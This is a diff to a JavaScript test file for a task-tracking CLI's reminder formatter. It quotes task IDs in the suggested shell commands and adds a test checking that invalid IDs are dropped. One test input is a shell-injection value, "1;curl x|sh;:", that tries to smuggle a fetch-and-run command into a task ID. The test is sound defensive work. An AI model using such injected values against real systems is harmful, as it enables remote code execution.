@@ -323,9 +323,9 @@ describe('formatUnnotedReminder', () => {
 			[
 				'Task 3.2 is still in progress with no note from this session.',
 				"If you worked on it, log what you did (write ' as '\\''):",
-				"  taskgraph note 3.2 '<what you did or decided>'",
+				"  taskgraph note '3.2' '<what you did or decided>'",
 				"If it's finished, check its criteria and close it:",
-				'  taskgraph set-status --id=3.2 --status=done',
+				"  taskgraph set-status --id='3.2' --status=done",
 				"If you didn't work on it, say so in one line and stop."
 			].join('\n')
 		);
@@ -343,6 +343,15 @@ describe('formatUnnotedReminder', () => {
 		expect(lines[5]).toBe(
 			"If you didn't work on them, say so in one line and stop."
 		);
+	});
+
+	it('names only valid IDs', () => {
+		const bad = task("1;curl x|sh;:\n2'");
+
+		expect(formatUnnotedReminder([bad])).toBe('');
+		const text = stripAnsi(formatUnnotedReminder([bad, task('4')]));
+		expect(text).toContain('Task 4 is still in progress');
+		expect(text).not.toContain('curl');
 	});
 
 	it('leaves task titles out and fits 80 columns', () => {
